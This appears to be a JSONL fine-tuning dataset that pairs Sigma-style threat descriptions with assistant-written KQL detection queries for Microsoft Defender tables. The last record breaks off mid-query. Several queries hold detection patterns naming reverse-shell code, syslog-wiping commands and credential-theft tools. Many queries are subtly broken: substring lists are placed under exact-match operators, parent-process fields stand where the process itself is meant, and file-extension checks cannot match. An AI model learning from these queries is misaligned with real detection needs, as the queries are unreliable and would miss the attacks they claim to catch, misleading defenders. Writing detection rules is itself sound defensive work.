{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the perl binary with the \"-e\" flag and common strings related to potential reverse shell activity Topic: proc_creation_lnx_perl_reverse_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"fdopen(\" and ProcessCommandLine contains \"::Socket::INET\") or (ProcessCommandLine contains \"Socket\" and ProcessCommandLine contains \"connect\" and ProcessCommandLine contains \"open\" and ProcessCommandLine contains \"exec\")) and (ProcessCommandLine =~ \" -e \" and InitiatingProcessFolderPath =~ \"/perl\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the addition of the \"Debugger\" value to the \"DbgManagedDebugger\" key in order to achieve persistence. Which will get invoked when an application crashes Topic: registry_set_dbgmanageddebugger_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Microsoft\\\\.NETFramework\\\\DbgManagedDebugger\" and (not(RegistryValueData =~ \"\\\"C:\\\\Windows\\\\system32\\\\vsjitdebugger.exe\\\" PID %d APPDOM %d EXTEXT \\\"%s\\\" EVTHDL %d\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading activity via the Aruba Networks Virtual Intranet Access \"arubanetsvc.exe\" process using DLL Search Order Hijacking Topic: image_load_side_load_aruba_networks_virtual_intranet_access"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where ((FolderPath endswith \"\\\\wtsapi32.dll\" or FolderPath endswith \"\\\\msvcr100.dll\" or FolderPath endswith \"\\\\msvcp100.dll\" or FolderPath endswith \"\\\\dbghelp.dll\" or FolderPath endswith \"\\\\dbgcore.dll\" or FolderPath endswith \"\\\\wininet.dll\" or FolderPath endswith \"\\\\iphlpapi.dll\" or FolderPath endswith \"\\\\version.dll\" or FolderPath endswith \"\\\\cryptsp.dll\" or FolderPath endswith \"\\\\cryptbase.dll\" or FolderPath endswith \"\\\\wldp.dll\" or FolderPath endswith \"\\\\profapi.dll\" or FolderPath endswith \"\\\\sspicli.dll\" or FolderPath endswith \"\\\\winsta.dll\" or FolderPath endswith \"\\\\dpapi.dll\") and InitiatingProcessFolderPath =~ \"\\\\arubanetsvc.exe\") and (not((FolderPath startswith \"C:\\\\Windows\\\\System32\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SysWOW64\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the installation of a new shim database where the file is located in a non-default location Topic: registry_set_persistence_shim_database_uncommon_location"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\InstalledSDB*\" and RegistryKey contains \"\\\\DatabasePath\") and (not(RegistryValueData contains \":\\\\Windows\\\\AppPatch\\\\Custom\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects service path modification via the \"sc\" binary to a suspicious command or path Topic: proc_creation_win_sc_service_path_modification"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"powershell\", \"cmd \", \"mshta\", \"wscript\", \"cscript\", \"rundll32\", \"svchost\", \"dllhost\", \"cmd.exe /c\", \"cmd.exe /k\", \"cmd.exe /r\", \"cmd /c\", \"cmd /k\", \"cmd /r\", \"C:\\\\Users\\\\Public\", \"\\\\Downloads\\\\\", \"\\\\Desktop\\\\\", \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\", \"C:\\\\Windows\\\\TEMP\\\\\", \"\\\\AppData\\\\Local\\\\Temp\")) and InitiatingProcessFolderPath =~ \"\\\\sc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc Topic: proc_creation_win_node_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" -e \", \" --eval \")) and InitiatingProcessFolderPath =~ \"\\\\node.exe\") and (ProcessCommandLine in~ (\".exec(\", \"net.socket\", \".connect\", \"child_process\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the recovery of files from backups via \"wbadmin.exe\".\nAttackers can restore sensitive files such as NTDS.DIT or Registry Hives from backups in order to potentially extract credentials.\n Topic: proc_creation_win_wbadmin_restore_file"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" recovery\", \"recoveryTarget\", \"itemtype:File\")) and (FolderPath endswith \"\\\\wbadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"WBADMIN.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files. Topic: proc_creation_win_gup_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" -unzipTo \", \"http\")) and (FolderPath endswith \"\\\\GUP.exe\" or ProcessVersionInfoOriginalFileName =~ \"gup.exe\")) and (not(InitiatingProcessFileName =~ \"\\\\notepad++.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific commands commonly used to remove or empty the syslog. Which is often used by attacker as a method to hide their tracks Topic: proc_creation_lnx_clear_syslog"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"rm /var/log/syslog\", \"rm -r /var/log/syslog\", \"rm -f /var/log/syslog\", \"rm -rf /var/log/syslog\", \"unlink /var/log/syslog\", \"unlink -r /var/log/syslog\", \"unlink -f /var/log/syslog\", \"unlink -rf /var/log/syslog\", \"mv /var/log/syslog\", \" >/var/log/syslog\", \" > /var/log/syslog\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension Topic: file_event_win_susp_desktopimgdownldr_file"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName =~ \"\\\\Personalization\\\\LockScreenImage\\\\\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\") and (not(FileName =~ \"C:\\\\Windows\\\\\")) and (not((FileName in~ (\".jpg\", \".jpeg\", \".png\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to disable the Windows Firewall using PowerShell Topic: proc_creation_win_powershell_disable_firewall"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Set-NetFirewallProfile \", \" -Enabled \", \" False\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\powershell_ise.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\"))) and (ProcessCommandLine in~ (\" -All \", \"Public\", \"Domain\", \"Private\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of \".vhd\"/\".vhdx\" files by browser processes.\nMalware can use mountable Virtual Hard Disk \".vhd\" files to encapsulate payloads and evade security controls.\n Topic: file_event_win_vhd_download_via_browsers"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".vhd\" and (InitiatingProcessFolderPath in~ (\"\\\\brave.exe\", \"\\\\chrome.exe\", \"\\\\firefox.exe\", \"\\\\iexplore.exe\", \"\\\\maxthon.exe\", \"\\\\MicrosoftEdge.exe\", \"\\\\msedge.exe\", \"\\\\msedgewebview2.exe\", \"\\\\opera.exe\", \"\\\\safari.exe\", \"\\\\seamonkey.exe\", \"\\\\vivaldi.exe\", \"\\\\whale.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"wget\" to download a \".zip\" or \".rar\" files from \"temp.sh\". As seen used by UNC4841 during their Barracuda ESG zero day exploitation. Topic: proc_creation_lnx_apt_unc4841_wget_download_compressed_file_tmep_sh"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".rar\" or ProcessCommandLine endswith \".zip\") and ProcessCommandLine =~ \"https://temp.sh/\" and InitiatingProcessFolderPath =~ \"/wget\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario. Topic: image_load_wmiprvse_wbemcomn_dll_hijack"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\wbem\\\\wbemcomn.dll\" and InitiatingProcessFolderPath =~ \"\\\\wmiprvse.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect file time attribute change to hide new or changes to existing files Topic: proc_creation_macos_change_file_time_attr"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-t\", \"-acmr\", \"-d\", \"-r\")) and InitiatingProcessFolderPath =~ \"/touch\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of python using the \"-c\" flag. This is could be used as a way to launch a reverse shell or execute live python code. Topic: proc_creation_win_python_inline_command_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \" -c\" and (ProcessVersionInfoOriginalFileName =~ \"python.exe\" or (FolderPath endswith \"python.exe\" or FolderPath endswith \"python3.exe\" or FolderPath endswith \"python2.exe\"))) and (not(((InitiatingProcessCommandLine =~ \"-E -s -m ensurepip -U --default-pip\" and InitiatingProcessFileName =~ \"\\\\python.exe\") or InitiatingProcessFileName =~ \"\\\\AppData\\\\Local\\\\Programs\\\\Microsoft VS Code\\\\Code.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an uncommon child process of \"odbcconf.exe\" binary which normally shouldnt have any child processes. Topic: proc_creation_win_odbcconf_uncommon_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\odbcconf.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of SecurityXploded Tools Topic: proc_creation_win_hktl_secutyxploded"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoCompanyName =~ \"SecurityXploded\" or FolderPath endswith \"PasswordDump.exe\" or ProcessVersionInfoOriginalFileName endswith \"PasswordDump.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file write event from/to a fake recycle bin folder that is often used as a staging directory for malware Topic: file_event_win_susp_recycle_bin_fake_exec"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (InitiatingProcessFolderPath contains \"RECYCLERS.BIN\\\\\" or InitiatingProcessFolderPath contains \"RECYCLER.BIN\\\\\") or (FolderPath contains \"RECYCLERS.BIN\\\\\" or FolderPath contains \"RECYCLER.BIN\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential Dridex acitvity via specific process patterns Topic: proc_creation_win_malware_dridex"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine in~ (\"C:\\\\Users\\\\\", \"\\\\Desktop\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\") and (not(InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\\"))) or ((InitiatingProcessFileName =~ \"\\\\excel.exe\" and (ProcessCommandLine in~ (\" -s \", \"\\\\AppData\\\\Local\\\\Temp\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\regsvr32.exe\") and (not(ProcessCommandLine =~ \".dll\"))) or (InitiatingProcessFileName =~ \"\\\\svchost.exe\" and ((ProcessCommandLine =~ \" /all\" and InitiatingProcessFolderPath =~ \"\\\\whoami.exe\") or (ProcessCommandLine =~ \" view\" and (InitiatingProcessFolderPath in~ (\"\\\\net.exe\", \"\\\\net1.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n Topic: proc_creation_win_susp_homoglyph_cyrillic_lookalikes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\u0430\", \"\u0435\", \"\u043e\", \"\u0440\", \"\u0441\", \"\u0445\", \"\u0455\", \"\u0456\", \"\u04cf\", \"\u0458\", \"\u04bb\", \"\u0501\", \"\u051b\", \"\u051d\", \"\u03bf\")) or (ProcessCommandLine in~ (\"\u0410\", \"\u0412\", \"\u0415\", \"\u041a\", \"\u041c\", \"\u041d\", \"\u041e\", \"\u0420\", \"\u0421\", \"\u0422\", \"\u0425\", \"\u0405\", \"\u0406\", \"\u0408\", \"\u04ae\", \"\u04c0\", \"\u050c\", \"\u051a\", \"\u051c\", \"\u0391\", \"\u0392\", \"\u0395\", \"\u0396\", \"\u0397\", \"\u0399\", \"\u039a\", \"\u039c\", \"\u039d\", \"\u039f\", \"\u03a1\", \"\u03a4\", \"\u03a5\", \"\u03a7\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious addition to BitLocker related registry keys via the reg.exe utility Topic: proc_creation_win_reg_bitlocker"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"EnableBDEWithNoTPM\", \"UseAdvancedStartup\", \"UseTPM\", \"UseTPMKey\", \"UseTPMKeyPIN\", \"RecoveryKeyMessageSource\", \"UseTPMPIN\", \"RecoveryKeyMessage\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"TcpClient\" class. Which can be abused to establish remote connections and reverse-shells. As seen used by the Nishang \"Invoke-PowerShellTcpOneLine\" reverse shell and other. Topic: proc_creation_win_powershell_reverse_shell_connection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" Net.Sockets.TCPClient\", \".GetStream(\", \".Write(\")) and ((ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")) or (FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a Sysinternals Tool via the creation of the \"accepteula\" registry key Topic: registry_add_pua_sysinternals_execution_via_eula"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"RegistryKeyCreated\" and RegistryKey endswith \"\\\\EulaAccepted\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Windows executables that write files with suspicious extensions Topic: file_event_win_shell_write_susp_files_extensions"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (((FileName in~ (\".bat\", \".dll\", \".exe\", \".hta\", \".iso\", \".ps1\", \".txt\", \".vbe\", \".vbs\")) and (InitiatingProcessFolderPath in~ (\"\\\\csrss.exe\", \"\\\\lsass.exe\", \"\\\\RuntimeBroker.exe\", \"\\\\sihost.exe\", \"\\\\smss.exe\", \"\\\\wininit.exe\", \"\\\\winlogon.exe\"))) or ((FileName in~ (\".bat\", \".hta\", \".iso\", \".ps1\", \".vbe\", \".vbs\")) and (InitiatingProcessFolderPath in~ (\"\\\\dllhost.exe\", \"\\\\rundll32.exe\", \"\\\\svchost.exe\")))) and (not((((FileName in~ (\":\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_\")) and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\dllhost.exe\") or ((FileName in~ (\"C:\\\\Windows\\\\System32\\\\GroupPolicy\\\\DataStore\\\\\", \"\\\\sysvol\\\\\", \"\\\\Policies\\\\\", \"\\\\Machine\\\\Scripts\\\\Startup\\\\\")) and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\svchost.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service starting Topic: proc_creation_win_hktl_meterpreter_getsystem"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\services.exe\" and ((ProcessCommandLine in~ (\"cmd\", \"%COMSPEC%\")) or (ProcessCommandLine in~ (\"rundll32\", \".dll,a\", \"/p:\"))) and (not(ProcessCommandLine =~ \"MpCmdRun\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect the use of \"<\" to read and potentially execute a file via cmd.exe Topic: proc_creation_win_cmd_stdin_redirect"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"<\" and (ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\" or FolderPath endswith \"\\\\cmd.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the bcdedit command to tamper with the boot configuration data. This technique is often times used by malware or attackers as a destructive way before launching ransomware. Topic: proc_creation_win_bcdedit_boot_conf_tamper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"bootstatuspolicy\" and ProcessCommandLine contains \"ignoreallfailures\") or (ProcessCommandLine contains \"recoveryenabled\" and ProcessCommandLine contains \"no\")) and (FolderPath endswith \"\\\\bcdedit.exe\" or ProcessVersionInfoOriginalFileName =~ \"bcdedit.exe\") and ProcessCommandLine =~ \"set\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of an \"svchost\" process with specific command line flags, that were seen present and used by ColdSteel RAT Topic: proc_creation_win_malware_coldsteel_service_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \" -k msupdate\" or ProcessCommandLine endswith \" -k msupdate2\" or ProcessCommandLine endswith \" -k alg\") and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"ProtocolHandler\" to download files. Downloaded files will be located in the cache folder (for example - %LOCALAPPDATA%\\Microsoft\\Windows\\INetCache\\IE)\n Topic: proc_creation_win_protocolhandler_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"ftp://\", \"http://\", \"https://\")) and (FolderPath endswith \"\\\\protocolhandler.exe\" or ProcessVersionInfoOriginalFileName =~ \"ProtocolHandler.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects sdiagnhost.exe calling a suspicious child process (e.g. used in exploits for Follina / CVE-2022-30190) Topic: proc_creation_win_sdiagnhost_susp_child"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\sdiagnhost.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\cmd.exe\", \"\\\\mshta.exe\", \"\\\\cscript.exe\", \"\\\\wscript.exe\", \"\\\\taskkill.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\calc.exe\"))) and (not(((ProcessCommandLine =~ \"bits\" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") or ((ProcessCommandLine endswith \"-noprofile -\" or ProcessCommandLine endswith \"-noprofile\") and InitiatingProcessFolderPath =~ \"\\\\powershell.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious process pattern which could be a sign of an exploited Serv-U service Topic: proc_creation_win_servu_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\Serv-U.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\", \"\\\\cscript.exe\", \"\\\\sh.exe\", \"\\\\bash.exe\", \"\\\\schtasks.exe\", \"\\\\regsvr32.exe\", \"\\\\wmic.exe\", \"\\\\mshta.exe\", \"\\\\rundll32.exe\", \"\\\\msiexec.exe\", \"\\\\forfiles.exe\", \"\\\\scriptrunner.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of screensaver files (.scr) outside of system folders. Attackers may execute an application as an \".SCR\" file using \"rundll32.exe desk.cpl,InstallScreenSaver\" for example. Topic: file_event_win_new_scr_file"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".scr\" and (not((FileName in~ (\":\\\\$WINDOWS.~BT\\\\NewOS\\\\\", \":\\\\Windows\\\\System32\\\\\", \":\\\\Windows\\\\SysWOW64\\\\\", \":\\\\Windows\\\\WinSxS\\\\\", \":\\\\WUDownloadCache\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the \"chflags\" utility with the \"hidden\" flag, in order to hide files on MacOS.\nWhen a file or directory has this hidden flag set, it becomes invisible to the default file listing commands and in graphical file browsers.\n Topic: proc_creation_macos_chflags_hidden_flag"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"hidden \" and InitiatingProcessFolderPath =~ \"/chflags\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"find\" binary in a suspicious manner to perform discovery Topic: proc_creation_lnx_susp_find_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-perm -4000\", \"-perm -2000\", \"-perm 0777\", \"-perm -222\", \"-perm -o w\", \"-perm -o x\", \"-perm -u=s\", \"-perm -g=s\")) and InitiatingProcessFolderPath =~ \"/find\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"esxcli\" command with the \"system\" and \"permission\" flags in order to assign admin permissions to an account. Topic: proc_creation_lnx_esxcli_permission_change_admin"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" permission \", \" set\", \"Admin\")) and InitiatingProcessFolderPath =~ \"/esxcli\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DLL sideloading of DLLs that are part of third party software (zoom, discord....etc) Topic: image_load_side_load_third_party"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\commfunc.dll\" and (not((FolderPath contains \"\\\\AppData\\\\local\\\\Google\\\\Chrome\\\\Application\\\\\" or (FolderPath startswith \"C:\\\\Program Files\\\\Lenovo\\\\Communications Utility\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\Lenovo\\\\Communications Utility\\\\\"))))) or (FolderPath endswith \"\\\\tosbtkbd.dll\" and (not((FolderPath startswith \"C:\\\\Program Files\\\\Toshiba\\\\Bluetooth Toshiba Stack\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\Toshiba\\\\Bluetooth Toshiba Stack\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Processes accessing the camera and microphone from suspicious folder Topic: registry_event_susp_mic_cam_access"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\CapabilityAccessManager\\\\ConsentStore*\" and RegistryKey contains \"\\\\NonPackaged\") and (RegistryKey contains \"microphone\" or RegistryKey contains \"webcam\") and (RegistryKey contains \":#Windows#Temp#\" or RegistryKey contains \":#$Recycle.bin#\" or RegistryKey contains \":#Temp#\" or RegistryKey contains \":#Users#Public#\" or RegistryKey contains \":#Users#Default#\" or RegistryKey contains \":#Users#Desktop#\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of registry keys containing the MSTSC connection history Topic: registry_delete_mstsc_history_cleared"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType =~ \"DeleteValue\" and RegistryKey contains \"\\\\Microsoft\\\\Terminal Server Client\\\\Default\\\\MRU\") or ((ActionType in~ (\"RegistryKeyDeleted\", \"RegistryValueDeleted\")) and RegistryKey endswith \"\\\\Microsoft\\\\Terminal Server Client\\\\Servers*\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to use system dialog prompts to capture user credentials Topic: proc_creation_macos_gui_input_capture"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath =~ \"/usr/sbin/osascript\" and (ProcessCommandLine in~ (\"-e\", \"display\", \"dialog\", \"answer\")) and (ProcessCommandLine in~ (\"admin\", \"administrator\", \"authenticate\", \"authentication\", \"credentials\", \"pass\", \"password\", \"unlock\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand Topic: proc_creation_win_sc_change_sevice_image_path_by_non_admin"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessIntegrityLevel in~ (\"Medium\", \"S-1-16-8192\")) and InitiatingProcessFolderPath =~ \"\\\\sc.exe\") and ((ProcessCommandLine in~ (\"config\", \"binPath\")) or (ProcessCommandLine in~ (\"failure\", \"command\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"ShellDispatch.dll\" Topic: image_load_side_load_shelldispatch"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\ShellDispatch.dll\" and (not(((FolderPath contains \":\\\\Users\\\\\" and FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\") or FolderPath contains \":\\\\Windows\\\\Temp\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\nAn adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\n Topic: proc_creation_win_powershell_zip_compress"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"Compress-Archive -Path\" and ProcessCommandLine contains \"-DestinationPath $env:TEMP\") or (ProcessCommandLine contains \"Compress-Archive -Path\" and ProcessCommandLine contains \"-DestinationPath\" and ProcessCommandLine contains \"\\\\AppData\\\\Local\\\\Temp\\\\\") or 